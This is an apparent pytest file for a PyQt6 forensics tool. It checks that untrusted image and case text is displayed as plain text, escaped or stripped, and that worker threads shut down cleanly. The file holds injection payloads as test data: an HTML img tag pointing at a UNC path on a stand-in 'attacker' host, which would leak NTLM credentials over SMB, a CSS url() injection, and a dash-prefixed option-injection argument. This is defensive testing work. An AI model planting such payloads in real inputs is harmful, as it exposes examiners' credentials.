"""
Text from the image, or from a case folder someone else prepared, is shown as
text: never handed to Qt or a browser as markup.

Qt renders anything that looks like HTML in a QLabel, QMessageBox, tooltip or
QTextEdit(text). ``<img src="\\\\host\\share\\x">`` there makes Qt open the
path, which on Windows is an SMB connection carrying the examiner's NTLM
credentials; ``<img src="/dev/zero">`` hangs the window reading it.
"""
import os
import re
import sys
import time

import pytest
from PyQt6.QtCore import Qt
from PyQt6.QtWidgets import QApplication, QMessageBox

from core.case import Case
from core.plugins import PluginArg, PluginInfo, PluginRegistry, build_command_args
from core.report import build_html
from ui import dialogs

PAYLOAD = '<img src="\\\\attacker\\share\\x.png">'
ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


def test_message_boxes_show_plain_text(qapp, monkeypatch):
    seen = []

    def fake_exec(box):
        seen.append((box.textFormat(), box.text()))
        return 0

    monkeypatch.setattr(QMessageBox, "exec", fake_exec)
    for show in (dialogs.warning, dialogs.critical, dialogs.information, dialogs.question):
        show(None, "Title", PAYLOAD)
    assert seen == [(Qt.TextFormat.PlainText, PAYLOAD)] * 4


def test_no_static_message_box_helpers_remain():
    """They render as AutoText; ui.dialogs has the same signatures, as plain text."""
    pattern = re.compile(r"QMessageBox\.(warning|critical|information|question)\(")
    offenders = []
    for folder in ("ui", "core"):
        for name in os.listdir(os.path.join(ROOT, folder)):
            if name.endswith(".py"):
                with open(os.path.join(ROOT, folder, name), encoding="utf-8") as fh:
                    if pattern.search(fh.read()):
                        offenders.append(f"{folder}/{name}")
    with open(os.path.join(ROOT, "main.py"), encoding="utf-8") as fh:
        if pattern.search(fh.read()):
            offenders.append("main.py")
    assert offenders == []


def test_bookmark_preview_shows_row_values_literally(qapp):
    from PyQt6.QtWidgets import QLabel
    from ui.bookmark_dialog import BookmarkDialog
    dialog = BookmarkDialog({"PID": "4", "Args": PAYLOAD}, "windows.cmdline.CmdLine", [])
    labels = [label for label in dialog.findChildren(QLabel) if PAYLOAD in label.text()]
    assert labels and all(l.textFormat() == Qt.TextFormat.PlainText for l in labels)


def test_case_notes_are_not_parsed_as_html(qapp, tmp_path):
    from ui.main_window import MainWindow
    notes = "<b>bold?</b> check PIDs <1000 and <script>x</script>"
    case = Case.create(str(tmp_path), "Notes", notes=notes)
    window = MainWindow(case, registry=PluginRegistry(None))
    try:
        assert window.notes_edit.toPlainText() == notes, "notes must round-trip intact"
        assert not window.notes_edit.acceptRichText()
    finally:
        if window._os_probe is not None:
            window._os_probe.cancel()
        window.close()


@pytest.mark.skipif(sys.platform == "win32", reason="Windows forbids < > in folder names")
def test_recent_case_tooltip_is_escaped(qapp, tmp_path):
    from core.case import _write_recent
    from ui.case_manager import CaseManager
    folder = tmp_path / "<img src=x>"
    folder.mkdir()
    _write_recent([{"directory": str(folder), "case_name": "Handed over"}])
    manager = CaseManager()
    tip = manager.recent_list.item(0).toolTip()
    assert "&lt;img src=x&gt;" in tip and "<img" not in tip
    manager.close()


def test_report_tag_colour_cannot_carry_css(qapp, tmp_path):
    case = Case.create(str(tmp_path), "Report")
    bookmark = {"label": "x", "tag": "Evil", "tag_color": "red;background:url(//host/x)"}
    html = build_html(case, [], [], [bookmark], [])
    assert "url(" not in html
    assert 'style="background:#6e7781"' in html


def test_report_cannot_load_anything(qapp, tmp_path):
    html = build_html(Case.create(str(tmp_path), "CSP"), [], [], [], [])
    csp = re.search(r'http-equiv="Content-Security-Policy" content="([^"]+)"', html)
    assert csp and "default-src 'none'" in csp.group(1)
    assert "<script" not in html


def test_scalar_arguments_cannot_be_read_as_options():
    info = PluginInfo("windows.vadyarascan.VadYaraScan", "windows",
                      args=(PluginArg("yara_string", "String", False),))
    assert build_command_args(info, {"yara_string": "-starts-with-a-dash"}) == [
        "--yara-string=-starts-with-a-dash"]


# ── Workers that must not outlive their owner ─────────────────────────────────

def _sparse(path, size):
    with open(path, "wb") as fh:
        fh.truncate(size)
    return str(path)


def test_hash_file_matches_hashlib(tmp_path):
    import hashlib
    from core.hash_worker import hash_file
    path = tmp_path / "img.raw"
    path.write_bytes(os.urandom(3 * 1024 * 1024 + 17))
    data = path.read_bytes()
    assert hash_file(str(path), chunk=1024 * 1024) == (
        hashlib.md5(data).hexdigest(), hashlib.sha256(data).hexdigest())


def test_a_cancelled_hash_emits_nothing(qapp, tmp_path):
    from core.hash_worker import HashWorker
    worker = HashWorker(_sparse(tmp_path / "big.raw", 1 << 30))
    got = []
    worker.hashes_ready.connect(lambda *a: got.append(a))
    worker.error.connect(lambda *a: got.append(a))
    worker.start()
    worker.cancel()
    assert worker.wait(10_000)
    QApplication.processEvents()
    assert got == []


def test_choosing_another_image_mid_hash_keeps_the_right_digests(qapp, tmp_path):
    """
    The first worker lost its last reference while running (a process abort),
    and its digests could land on the second image's record.
    """
    import hashlib
    from ui.wizard import CaseWizard
    first = _sparse(tmp_path / "first.raw", 512 * 1024 * 1024)
    second = tmp_path / "second.raw"
    second.write_bytes(b"the image actually chosen")
    wizard = CaseWizard()
    wizard._on_image_loaded(first)
    wizard._on_image_loaded(str(second))
    deadline = time.monotonic() + 30
    while wizard.md5_edit.text() == "Computing..." and time.monotonic() < deadline:
        QApplication.processEvents()
        time.sleep(0.01)
    assert wizard.md5_edit.text() == hashlib.md5(second.read_bytes()).hexdigest()
    wizard.reject()                      # must not leave a thread running
    assert wizard._hash_worker is None


def test_closing_the_window_stops_its_hashing(qapp, tmp_path):
    from ui.main_window import MainWindow
    image = _sparse(tmp_path / "huge.raw", 1 << 30)
    case = Case.create(str(tmp_path), "Closing", image_path=image)
    window = MainWindow(case, registry=PluginRegistry(None))
    if window._os_probe is not None:
        window._os_probe.cancel()
    window._hash_source(window.active_source_id, image)
    worker = window._hash_worker
    assert worker is not None and worker.isRunning()
    window.close()
    assert worker.isFinished(), "a running QThread destroyed with its window aborts"


def test_a_probe_cancelled_before_launch_does_not_run_to_its_timeout(qapp, monkeypatch):
    """cancel() between taking the gate and Popen used to find nothing to stop."""
    from core import os_detect
    probe = os_detect.ImageProbe("/nonexistent.raw")

    def acquire(**_kwargs):
        probe._cancelled = True          # the cancel lands inside the window
        return True

    monkeypatch.setattr(os_detect.RUN_GATE, "acquire", acquire)
    started = time.monotonic()
    probe._guarded([sys.executable, "-c", "import time; time.sleep(30)"], timeout=60)
    assert time.monotonic() - started < 10
